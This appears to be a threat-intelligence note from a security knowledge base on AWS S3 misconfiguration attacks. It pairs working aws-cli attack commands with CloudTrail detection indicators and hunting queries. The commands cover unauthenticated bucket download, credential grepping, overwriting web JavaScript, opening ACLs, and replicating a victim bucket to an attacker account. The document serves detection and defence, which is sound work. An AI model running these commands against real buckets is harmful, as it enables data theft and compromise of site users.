---
title: AWS S3 Misconfiguration and Bucket Attacks
date: 2026-03-08
type: ttp
mitre_id: T1530, T1537, T1190, T1083, T1078.004
mitre_tactic: Collection, Exfiltration, Initial Access, Discovery
threat_actors: []
tools_used: [aws-cli, S3enum, cloud_enum, LazyS3, AWS Extender, Nuclei, Burp Suite, Pacu]
platforms: [AWS]
tags:
  - type/ttp
  - status/active
  - platform/aws
  - category/misconfiguration
  - category/exfiltration
  - category/s3
source:
  url: https://www.intigriti.com/researchers/blog/hacking-tools/hacking-misconfigured-aws-s3-buckets-a-complete-guide
  author: Intigriti / hackingthe.cloud
  date: 2024
---

## Summary
AWS S3 misconfiguration attacks exploit overly permissive bucket policies, ACLs, and IAM permissions. Attacks range from unauthenticated enumeration and data theft to stealthy cross-account exfiltration via bucket replication. Because S3 is a foundational service used across virtually every AWS environment, misconfigurations are endemic and the data exposed is often critical — credentials, PII, backups, and source code. Approximately 31% of S3 buckets have some form of public exposure.

## How It Works

### Step 1 — Bucket Discovery
Attackers identify target buckets through passive recon (traffic interception, DNS, search engine dorking) or active brute force of naming conventions.

```bash
# Passive — search for S3 references in intercepted traffic
# Header: x-amz-bucket-region
# Pattern: \.s3\.amazonaws\.com\/
# Search engine dorking:
# site:.s3.amazonaws.com "target-company"
# site:.s3.amazonaws.com "target-company" filetype:pdf

# Active — brute force naming conventions
s3enum -wordlist wordlist.txt -bucket target-company
cloud_enum -k target-company
ruby lazys3.rb target-company
```

### Step 2 — Permission Probing (Unauthenticated)
Test all permission types without credentials using `--no-sign-request`:

```bash
aws s3 ls s3://BUCKET --no-sign-request                              # List
aws s3api get-object --bucket BUCKET --key FILE out --no-sign-request # Read
aws s3 cp test.txt s3://BUCKET/test.txt --no-sign-request            # Write
aws s3api get-bucket-acl --bucket BUCKET --no-sign-request           # ACL read
aws s3api get-bucket-policy --bucket BUCKET --no-sign-request        # Policy read
```

### Step 3 — Exploitation (Path Dependent)

**Path A — Read access → Data exfiltration**
```bash
aws s3 cp s3://BUCKET/ ./ --recursive --no-sign-request
grep -r "AKIA\|aws_secret\|password\|token" ./
```

**Path B — Write access → Content injection / supply chain**
```bash
# Overwrite a JavaScript asset on a web-facing bucket
aws s3 cp malicious.js s3://BUCKET/assets/app.js --no-sign-request
```

**Path C — ACL write → Privilege escalation within S3**
```bash
aws s3api put-bucket-acl --bucket BUCKET --acl public-read-write
```

**Path D — Authenticated access → Cross-account replication exfil**
```bash
# Requires: s3:PutBucketReplication + iam:PassRole on victim account
# Set up attacker-controlled destination bucket, then:
aws s3api put-bucket-versioning --bucket VICTIM-BUCKET \
  --versioning-configuration Status=Enabled

aws s3api put-bucket-replication --bucket VICTIM-BUCKET \
  --replication-configuration file://replication.json
# All current and future objects silently replicate to attacker account
```

**Path E — Deleted bucket → Domain takeover**
```
Find: assets.company.com CNAME → company-assets.s3.amazonaws.com (deleted)
Exploit: Register company-assets bucket in attacker account
Result: Serve malicious content under victim's domain (XSS, phishing, cookie theft)
```

---

## Technical Reference

### Misconfiguration Types

| Type | Risk | Exploitable With |
|---|---|---|
| List permissions open | Exposes all object keys | `--no-sign-request` |
| Read permissions open | Unauthenticated object download | `get-object --no-sign-request` |
| Write permissions open | Upload/overwrite objects, stored XSS via SVG | `cp` to bucket |
| ACL read open | Reveals full access control policies | `get-bucket-acl` |
| ACL write open | Attacker can grant themselves full access | `put-bucket-acl` |
| Versioning disabled | Deleted/overwritten objects unrecoverable | N/A |
| Missing file type restrictions | Bypass server-side validation, upload executables | Direct `PutObject` |
| Public block settings disabled | Bucket exposed to internet | Console/API check |

### Naming Convention Brute Force Wordlist
Common bucket naming patterns to target:
```
target-company
target-company-backup
target-company-dev
target-company-prod
target-company-staging
target-company-logs
target-company-data
target-company-assets
target-company-images
target-company-files
```

### Core Attack Commands

#### Unauthenticated Enumeration
```bash
# List bucket contents (no credentials)
aws s3 ls s3://BUCKET_NAME --no-sign-request

# Read a specific object
aws s3api get-object --bucket BUCKET --key FILE ./output --no-sign-request

# Download entire bucket
aws s3 cp s3://BUCKET/ ./ --recursive --no-sign-request

# Check ACL
aws s3api get-bucket-acl --bucket BUCKET --no-sign-request
aws s3api get-object-acl --bucket BUCKET --key FILE --no-sign-request

# Check versioning status
aws s3api get-bucket-versioning --bucket BUCKET --no-sign-request

# Check bucket policy
aws s3api get-bucket-policy --bucket BUCKET --no-sign-request
```

#### Authenticated Enumeration (with credentials)
```bash
# List all buckets in account
aws s3 ls

# Get bucket location
aws s3api get-bucket-location --bucket BUCKET

# Check public access block settings
aws s3api get-public-access-block --bucket BUCKET

# List object versions
aws s3api list-object-versions --bucket BUCKET

# Check server-side encryption
aws s3api get-bucket-encryption --bucket BUCKET
```

#### Write Abuse
```bash
# Upload a file (test write access)
aws s3 cp test.txt s3://BUCKET/test.txt --no-sign-request

# Overwrite critical file (e.g., web app config)
aws s3 cp malicious.js s3://BUCKET/app.js --no-sign-request

# Modify ACL to grant self full access
aws s3api put-bucket-acl --bucket BUCKET --acl public-read-write
```

### Attack Chain Detail

#### Chain 1: Unauthenticated Data Exfiltration
```
1. Enumerate bucket name (naming convention brute force or passive discovery)
         │
         ▼
2. List bucket contents: aws s3 ls s3://BUCKET --no-sign-request
         │
         ▼
3. Identify sensitive files (credentials, PII, backups, source code)
         │
         ▼
4. Download: aws s3 cp s3://BUCKET/ ./ --recursive --no-sign-request
         │
         ▼
5. Search downloaded content for AWS keys, DB passwords, PII
   grep -r "AKIA\|aws_secret\|password" ./
```

#### Chain 2: Cross-Account Data Exfiltration via Bucket Replication
Requires: `s3:PutBucketReplication`, `iam:PassRole`, `s3:PutBucketVersioning`

```
1. In attacker-controlled AWS account:
   - Create destination S3 bucket with versioning enabled
   - Create KMS key if source objects are encrypted
   - Configure bucket policy to allow source account's replication role

2. In victim account (post-compromise):
   - Create IAM role with S3 and KMS replication permissions
   - Enable versioning on source bucket
   - Configure PutBucketReplication pointing to attacker bucket

3. All existing and future objects replicate silently to attacker account
   - Use S3 Batch Operations (JobCreated) to replicate existing objects
```

**Key API calls generated (CloudTrail):**
```
PutBucketReplication
PutBucketVersioning
JobCreated (S3 Batch Operations)
KMS Decrypt / Encrypt with s3-replication role prefix
```

#### Chain 3: Domain Takeover via Deleted S3 Bucket
```
1. Find dangling CNAME/DNS record pointing to deleted S3 bucket
   (e.g., assets.company.com → company-assets.s3.amazonaws.com)

2. Bucket name is available — register it in attacker account

3. Serve malicious content from the now-attacker-controlled bucket
   under the victim's legitimate domain

4. Use cases: phishing, cookie theft, stored XSS, CSP bypass
```

#### Chain 4: Write Access → Stored XSS / Supply Chain
```
1. Find writable bucket hosting web assets (JS, HTML, images)

2. Upload malicious file:
   aws s3 cp malicious.js s3://BUCKET/assets/app.js --no-sign-request

3. Victim's website now serves attacker-controlled JavaScript to all users

4. Impact: session theft, credential harvesting, supply chain compromise
```

### Key Indicators in CloudTrail

| Event | Significance |
|---|---|
| `ListBuckets` from unknown IP | Enumeration |
| `GetBucketAcl` / `GetBucketPolicy` | Recon |
| `GetObject` with no auth (no user identity) | Unauthenticated read |
| `PutObject` from unexpected identity | Write abuse |
| `PutBucketAcl` | ACL modification |
| `PutBucketReplication` | Exfil setup |
| `PutBucketVersioning` on established bucket | Replication prereq |
| `JobCreated` (S3 Batch Ops) | Bulk exfil of existing objects |

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| Data from Cloud Storage | T1530 | Reading objects from S3 buckets (authenticated or unauthenticated) |
| Transfer Data to Cloud Account | T1537 | Cross-account bucket replication to attacker-controlled storage |
| Exploit Public-Facing Application | T1190 | Exploiting publicly accessible misconfigured buckets |
| File and Directory Discovery | T1083 | Enumerating bucket contents and object keys |
| Valid Accounts: Cloud Accounts | T1078.004 | Using compromised IAM credentials for authenticated S3 access |

---

## Detection Opportunities

### Key Log Sources
- **CloudTrail** — all S3 management API calls (bucket creation, policy changes, replication config)
- **S3 Server Access Logs** — object-level GET/PUT activity (must be enabled per bucket)
- **CloudWatch** — S3 request metrics (request spikes, error rates)
- **GuardDuty** — `S3/AnomalousBehavior`, `UnauthorizedAccess:S3/MaliciousIPCaller`
- **AWS Config** — bucket policy and ACL configuration history

### Behavioral Indicators
- `ListBuckets` or `GetBucketAcl` calls from IPs with no prior history in the account
- Bulk `GetObject` requests from a single identity in a short window (data staging)
- `PutBucketReplication` from any identity that is not a known automation role
- `PutBucketVersioning` on an established, previously unversioned production bucket
- `JobCreated` S3 Batch Operations event outside of known scheduled jobs
- `PutObject` from an unexpected identity, especially to web-asset buckets
- `PutBucketAcl` or `PutBucketPolicy` modifications outside change windows
- KMS `Decrypt` events with a principal prefixed with `s3-replication` pointing to a cross-account key

### Artifacts Left Behind
- New replication configuration on a production bucket
- Versioning suddenly enabled on a bucket that didn't have it
- New IAM role with S3 replication permissions not tied to known infrastructure
- Modified bucket policy granting access to unknown AWS account IDs
- New or modified CORS configuration allowing unexpected origins

---

## Query Stubs

### CrowdStrike FQL
```fql
// S3 replication config added — high priority exfil signal
event_simpleName=CloudTrailEvent
| EventName=PutBucketReplication
| table _time, UserIdentityArn, RequestParameters, SourceIPAddress

// Bulk GetObject from single identity (data staging)
event_simpleName=CloudTrailEvent
| EventName=GetObject
| stats count by UserIdentityArn, S3Bucket
| where count > 100

// Bucket policy or ACL modification outside known roles
event_simpleName=CloudTrailEvent
| EventName IN ("PutBucketPolicy", "PutBucketAcl")
| NOT UserIdentityArn IN (known_automation_roles)
| table _time, UserIdentityArn, EventName, RequestParameters
```

### Databricks SQL
```sql
-- S3 replication, versioning, and batch ops — exfil chain
SELECT
  event_time,
  user_identity_arn,
  event_name,
  request_parameters,
  source_ip_address
FROM cloudtrail_events
WHERE event_name IN (
  'PutBucketReplication',
  'PutBucketVersioning',
  'JobCreated',
  'PutBucketPolicy',
  'PutBucketAcl'
)
ORDER BY event_time DESC;

-- Bulk object access — data staging detection
SELECT
  DATE_TRUNC('hour', event_time) AS hour,
  user_identity_arn,
  JSON_EXTRACT_SCALAR(request_parameters, '$.bucketName') AS bucket,
  COUNT(*) AS get_count
FROM cloudtrail_events
WHERE event_name = 'GetObject'
  AND event_time >= CURRENT_DATE - INTERVAL 30 DAYS
GROUP BY 1, 2, 3
HAVING get_count > 100
ORDER BY get_count DESC;

-- Cross-account bucket policy grants
SELECT
  event_time,
  user_identity_arn,
  event_name,
  request_parameters,
  source_ip_address
FROM cloudtrail_events
WHERE event_name IN ('PutBucketPolicy', 'PutBucketAcl')
  AND request_parameters LIKE '%arn:aws:iam::%'
ORDER BY event_time DESC;
```

---

## Tools Reference

| Tool | Purpose | Source |
|---|---|---|
| `aws s3` / `aws s3api` | Core enumeration and exploitation | AWS CLI |
| S3enum | Bucket name brute force | Golang open source |
| cloud_enum | Multi-cloud OSINT discovery | Python open source |
| LazyS3 | Bucket naming convention attack | Ruby open source |
| AWS Extender | Burp Suite plugin for S3 permission testing | PortSwigger BApp Store |
| Nuclei | Template-based ACL misconfiguration scanning | ProjectDiscovery |
| Pacu | S3 enumeration and exploitation modules | Rhino Security Labs |

---

## Threat Actor Usage
S3 misconfiguration exploitation is extremely common across all threat actor categories — it requires minimal skill for public bucket access but scales to sophisticated cross-account exfil for advanced actors.

| Actor Type | Common Method |
|---|---|
| Bug bounty / opportunistic | Unauthenticated list + read via `--no-sign-request` |
| Financially motivated | Credential and PII harvesting from exposed buckets |
| Nation-state / advanced | Replication-based exfil, domain takeover for phishing |
| Insider threat | Authenticated bulk download, replication to personal account |

---

## References
- [Intigriti: Hacking Misconfigured AWS S3 Buckets — Complete Guide](https://www.intigriti.com/researchers/blog/hacking-tools/hacking-misconfigured-aws-s3-buckets-a-complete-guide)
- [hackingthe.cloud: S3 Bucket Replication Exfiltration](https://hackingthe.cloud/aws/exploitation/s3-bucket-replication-exfiltration/)
- [Qualys: Hidden Risks of Amazon S3 Misconfigurations](https://blog.qualys.com/vulnerabilities-threat-research/2023/12/18/hidden-risks-of-amazon-s3-misconfigurations)

## Related Notes
- [[Hunt - AWS S3 Misconfiguration and Exfiltration]] — active hunt hypothesis with queries
- [[AWS IAM Privilege Escalation]] — IAM permissions enabling authenticated S3 attacks
- [[EC2 Instance Metadata Service Abuse]] — IMDS credential theft enabling authenticated S3 access
- [[30 - Knowledge/Cybersecurity/Research Index]]
